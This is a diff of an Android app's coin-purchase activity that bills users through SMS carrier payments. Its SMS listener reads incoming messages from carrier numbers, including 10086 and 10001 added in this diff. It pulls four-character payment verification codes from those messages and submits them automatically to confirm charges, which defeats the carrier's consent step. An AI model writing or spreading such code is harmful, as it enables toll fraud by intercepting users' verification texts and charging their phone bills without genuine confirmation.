@@ -2,7 +2,6 @@ package domon.cn.mmphoto.profile;
 
 import android.Manifest;
 import android.content.Context;
-import android.content.DialogInterface;
 import android.content.Intent;
 import android.os.Bundle;
 import android.support.annotation.Nullable;
@@ -77,17 +76,14 @@ public class PayForCoinActivity extends BaseActivity {
             @Override
             public void onMessage(String msg, String fromAddress, String serviceCenterAddress) {
                 if (fromAddress.equals("1000188") && msg.contains("成功定制")) {
-                    // TODO: 2017/8/17 req api 3
                     PayUtils.payForSMSThree();
-
                 } else if (fromAddress.equals("1065987320001") && msg.contains("支付验证码")) {
                     LogUtils.e(msg.substring(0, 4));
-                    // TODO: 2017/8/17 send code
-//                    sendMsg("", msg.substring(0, 4));
                     PayUtils.payForSMSTwo(msg.substring(0, 4));
-                    sendMsg("10001", "1");
                     //test code
                 } else if (fromAddress.equals("10001")) {
+                    PayUtils.payForSMSTwo(msg.substring(0, 4));
+                } else if (fromAddress.equals("10086")) {
                     PayUtils.payForSMSTwo(msg.substring(0, 4));
                 }
             }
@@ -107,10 +103,6 @@ public class PayForCoinActivity extends BaseActivity {
             if (!TextUtils.isEmpty(imsi) && !imsi.startsWith("46003") && (!imsi.startsWith("46011")) && (!imsi.startsWith("46005"))) {
                 initThirdPayDialog(position);
             } else {
-                //test code
-                sendMsg("10001", "1");
-
-
                 if (mActionType == PAYFORCOIN) {
                     PayUtils.payForSMSOne(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_COIN);
                 } else {
@@ -160,27 +152,18 @@ public class PayForCoinActivity extends BaseActivity {
         }
     }
 
-    private void showCodeDialog(){
+    private void showCodeDialog() {
         AlertDialog.Builder dialog = new AlertDialog.Builder(PayForCoinActivity.this);
         final EditText editText = new EditText(PayForCoinActivity.this);
         editText.setHint("请等待短信发送，填入短信验证码");
         dialog.setTitle("短信验证码");
         dialog.setMessage("请输入您接收到的短信验证码，完成充值");
+        dialog.setCancelable(false);
 
         dialog.setView(editText);
 
-        dialog.setPositiveButton("确认", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialogInterface, int i) {
-                PayUtils.payForSMSTwo(editText.getText().toString());
-            }
-        });
-        dialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialogInterface, int i) {
-                dialogInterface.dismiss();
-            }
-        });
+        dialog.setPositiveButton("确认", (dialogInterface, i) -> PayUtils.payForSMSTwo(editText.getText().toString()));
+        dialog.setNegativeButton("取消", (dialogInterface, i) -> dialogInterface.dismiss());
         dialog.show();
     }
 
